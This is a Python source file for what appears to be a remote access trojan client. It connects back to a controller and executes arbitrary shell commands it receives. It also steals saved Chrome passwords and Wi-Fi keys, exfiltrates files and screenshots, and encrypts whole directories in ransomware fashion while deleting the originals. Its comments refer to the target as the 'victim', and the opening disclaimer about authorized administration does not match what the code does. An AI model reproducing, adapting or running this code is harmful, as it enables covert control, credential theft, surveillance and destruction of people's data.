#Created by Xand

#Disclaimer: This reverse shell should only be used in the lawful, remote administration of authorized systems. Accessing a computer network without authorization or permission is illegal.

import socket
import time
import platform
import subprocess
import os
from io import BytesIO
import certifi
from Crypto.Hash import SHA256
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import cv2
import numpy as np
from PIL import ImageGrab
from os import getenv
import sqlite3
import win32crypt
import shutil

port = 4000
host = socket.gethostbyname(socket.gethostname())

#recieves command from server
def recieve_commands():
    connection = False
    while connection != True:
        try:
            global s
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))
            connection = True
        except socket.error as err:
            pass
        if connection == False:
            time.sleep(300)

    while True:
        cmd = s.recv(65536).decode()
        if cmd == "specs":
            sys_info(s)
        elif cmd == " ":
            s.send('\033[1;31mA0X:~\033[1;m'.encode() + str(os.getcwd() + "$ " ).encode())
        elif cmd == "wifi_passwords":
            get_wifi_password(s)
        elif "get" in cmd:
            send_file(s, cmd[4:])
        elif "send" in cmd:
            receive_file(s, cmd[5:])
        elif "delete" in cmd:
            delete_all_files(s, cmd[7:])
        elif "screenshot" in cmd:
            captureScreen(s)
        elif "chrome_passwords" in cmd:
            get_chrome_password(s)
        elif "encrypt" in cmd:
            cmd = cmd.split(" ")
            if len(cmd) > 3:
                s.send("Too many arguments!!! \n".encode() + '\033[1;31mA0X:~\033[1;m'.encode() + str(os.getcwd() + "$ ").encode())
            else:
                encryptAllFiles(s, getKey("".join(cmd[1])), "".join(cmd[2]))
        elif "decrypt" in cmd:
            cmd = cmd.split(" ")
            if len(cmd) > 3:
                s.send("Too many arguments!!!".encode() + '\033[1;31mA0X:~\033[1;m'.encode() + str(os.getcwd() + "$ ").encode())
            else:
                decryptAllFiles(s, getKey("".join(cmd[1])), "".join(cmd[2]))
        elif cmd[:2] == 'cd':
            try:
                os.chdir(cmd[3:])
                result = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                result = result.stdout.read() + result.stderr.read()
                result = "\n" + result.decode()
                if "The system cannot find the path specified." in result:
                    result = "\n"
                    s.send(str(result).encode() + '\033[1;31mA0X:~\033[1;m'.encode() + str(os.getcwd() + "$ ").encode())
                else:
                    s.send(str(result).encode() + '\033[1;31mA0X:~\033[1;m'.encode() + str(os.getcwd() + "$ ").encode())
            except(FileNotFoundError, IOError):
                s.send("Directory does not exist!!! \n".encode() + '\033[1;31mA0X:~\033[1;m'.encode() + str(os.getcwd() + "$ " ).encode())
        else:
            result = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            result = result.stdout.read() + result.stderr.read()
            result = result.decode()
            s.send(str(result).encode() + '\033[1;31mA0X:~\033[1;m'.encode() + str(os.getcwd() + "$ ").encode())

#sends file to server
def send_file(conn, usrFile):
        conn.send(usrFile.encode())
        if not os.path.exists(usrFile):
            conn.send("File does not exist!!!".encode() + '\n\033[1;31mA0X:~\033[1;m'.encode() + str(os.getcwd() + "$ ").encode())
        else:
            conn.send('\033[1;31mA0X:~\033[1;m'.encode() + str(os.getcwd() + "$ ").encode())
            fileSize = os.path.getsize(usrFile)
            conn.send(str(fileSize).encode())
            time.sleep(1)

            with open(usrFile, 'rb') as file:
                data = file.read(1024)
                if fileSize == 0:
                    pass
                elif fileSize < 1024:
                     conn.send(data)
                     file.close()
                else:
                    while data:
                        conn.send(data)
                        data = file.read(1024)
                    file.close()

#receives file from server
def receive_file(conn, usrFile):
    fileSize = int(conn.recv(1024).decode())
    if fileSize == 0:
        pass
    else:
        with open(usrFile, 'wb') as file:
            if fileSize < 1024:
                data = conn.recv(1024)
                file.write(data)
                file.close()
            else:
                data = conn.recv(1024)
                totalFileRecv = len(data)
                while totalFileRecv < fileSize:
                    totalFileRecv += len(data)
                    file.write(data)
                    data = conn.recv(1024)
                file.write(data)
                file.close()
        conn.send('\033[1;31mA0X:~\033[1;m'.encode() + str(os.getcwd() + "$ ").encode())

#displays system specs
def sys_info(conn):
    specs = [
           "\t" + "Node: " + str(platform.node() + "\n"),
           "\t" + "System: " + str(platform.system() + "\n"),
           "\t" + "Release: " + str(platform.release() + "\n"),
           "\t" + "Version: " + str(platform.version() + "\n"),
           "\t" + "Machine: " + str(platform.machine() + "\n"),
           "\t" + "Platform: " + str(platform.platform()  + "\n"),
           ]
    specs = " ".join(specs)
    conn.send(specs.encode() + '\033[1;31mA0X:~\033[1;m'.encode() + str(os.getcwd() + "$ " ).encode())


#retrieves all saved chrome password
def get_chrome_password(conn):
    wifi_details = []
    path = getenv("LOCALAPPDATA") + "\Google\Chrome\\User Data\Default\Login Data"
    path2 = getenv("LOCALAPPDATA") + "\Google\Chrome\\User Data\Default\Login2"
    shutil.copy(path, path2)
    sqlConn = sqlite3.connect(path2)
    cursor = sqlConn.cursor()
    cursor.execute('SELECT action_url, username_value, password_value FROM logins')
    for data in cursor.fetchall():
        password = win32crypt.CryptUnprotectData(data[2])[1]
        wifi_details.append("Link:" + data[0] + " " + "Username:" + data[1] + " " + "Password:" + str(password.decode() + "\n"))
    sqlConn.close()
    string_wifi_details = " ".join(wifi_details) + "\n"
    conn.send(string_wifi_details.encode() + '\033[1;31mA0X:~\033[1;m'.encode() + str(os.getcwd() + "$ ").encode())


#gets all wifi password that the system has ever connected to
def get_wifi_password(conn):
    cmd = ['netsh', 'wlan', 'show', 'profiles']
    res = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    res = res.stdout.read() + res.stderr.read()
    res = res.decode().split('\n')
    res = [i.split(":")[1][1:-1] for i in res if "All User Profile" in i]

    result_list = []

    for wifi in res:
        cmd = ['netsh', 'wlan', 'show', 'profiles', wifi, 'key=clear']
        cmd = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        results = cmd.stdout.read() + cmd.stderr.read()
        results = results.decode().split("\n")
        results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
        results = " ".join(results)
        result_list.append("\t" + wifi + ": " + str(results) + "\n")
        results = " ".join(result_list)
    conn.send(results.encode() + '\033[1;31mA0X:~\033[1;m'.encode() + str(os.getcwd() + "$ " ).encode())


#deletes all files in the directory
def delete_all_files(conn, directory):
    if os.path.exists(directory):
        file_paths = []
        for root, directories, files in os.walk(directory):

            for filename in files:
                filepath = os.path.join(root, filename)
                file_paths.append(filepath)
        file_length = len(file_paths)
        conn.send("\t [+] {} files deleted !!!".format(file_length).encode() + ' \n \033[1;31mA0X:~\033[1;m'.encode() + str( os.getcwd() + "$ ").encode())
    else:
        conn.send("\t [+] Directory does not exist".encode() + ' \n\033[1;31mA0X:~\033[1;m'.encode() + str(os.getcwd() + "$ " ).encode())
        pass


def getKey(password):
    hasher = SHA256.new(password.encode('utf-8'))
    return hasher.digest()


#encrypts victim's file
def encryptAllFiles(conn, key, directory):
    if os.path.exists(directory):
        file_paths = []
        for root, directories, files in os.walk(directory):
            for filename in files:
                filepath = os.path.join(root, filename)
                file_paths.append(filepath)

        for usrFile in file_paths:
            filename = usrFile.split("\\")
            filename = "".join(filename[-1])

            chunksize = 64*1024
            outputFile = os.path.join(directory, "(encrypted)" + filename)
            filesize = str(os.path.getsize(usrFile)).zfill(16)
            IV = get_random_bytes(16)

            encryptor = AES.new(key, AES.MODE_CBC, IV)

            with open(usrFile, 'rb') as infile:
                with open(outputFile, 'wb') as outfile:
                    outfile.write(filesize.encode('utf-8'))
                    outfile.write(IV)

                    while True:
                        chunk = infile.read(chunksize)

                        if len(chunk) == 0:
                            break

                        elif len(chunk) % 16 != 0:
                            chunk += b' ' * (16 - (len(chunk) % 16))

                        outfile.write(encryptor.encrypt(chunk))
                    infile.close()
                os.remove(usrFile)

        conn.send("\t [+] File has been encrypted".encode() + ' \n\033[1;31mA0X:~\033[1;m'.encode() + str(os.getcwd() + "$ ").encode())
    else:
        conn.send("\t [+] Directory does not exist".encode() + ' \n\033[1;31mA0X:~\033[1;m'.encode() + str(os.getcwd() + "$ ").encode())
        pass

#decrypts victim's file
def decryptAllFiles(conn, key, directory):
    if os.path.exists(directory):
        file_paths = []

        for root, directories, files in os.walk(directory):
            for filename in files:
                filepath = os.path.join(root, filename)
                file_paths.append(filepath)

        for usrFile in file_paths:
            outputFile = usrFile.split("\\")
            outputFile = "".join(outputFile[-1])
            outputFile = outputFile.replace("(encrypted)", "")
            outputFile = os.path.join(directory, outputFile)

            chunksize = 64 * 1024

            with open(usrFile, 'rb') as infile:
                filesize = int(infile.read(16))
                IV = infile.read(16)
                decryptor = AES.new(key, AES.MODE_CBC, IV)

                with open(outputFile, 'wb') as outfile:
                    while True:
                        chunk = infile.read(chunksize)

                        if len(chunk) == 0:
                            break
                        outfile.write(decryptor.decrypt(chunk))
                    outfile.truncate(filesize)

            os.remove(usrFile)
        conn.send("\t [+] File has been decrypted".encode() + ' \n\033[1;31mA0X:~\033[1;m'.encode() + str(os.getcwd() + "$ ").encode())
    else:
        conn.send("\t [+] File does not exist".encode() + ' \n\033[1;31mA0X:~\033[1;m'.encode() + str(os.getcwd() + "$ ").encode())
        pass

#takes a screen shot of the victim's machine and sends it to the server
def captureScreen(conn):
    conn.send('\033[1;31mA0X:~\033[1;m'.encode() + str(os.getcwd() + "$ ").encode())
    img = ImageGrab.grab()
    img_np = np.array(img)
    frame = cv2.cvtColor(img_np, cv2.COLOR_BGR2GRAY)
    cv2.imshow("frame", frame)
    imgName = "img.jpg"
    cv2.imwrite(imgName, frame)
    cv2.destroyAllWindows()

    fileSize = os.path.getsize(imgName)
    conn.send(str(fileSize).encode())
    with open(imgName, 'rb') as file:
        content = file.read(1024)
        while content:
            conn.send(content)
            content = file.read(1024)
    file.close()
    os.remove("img.jpg")


recieve_commands()
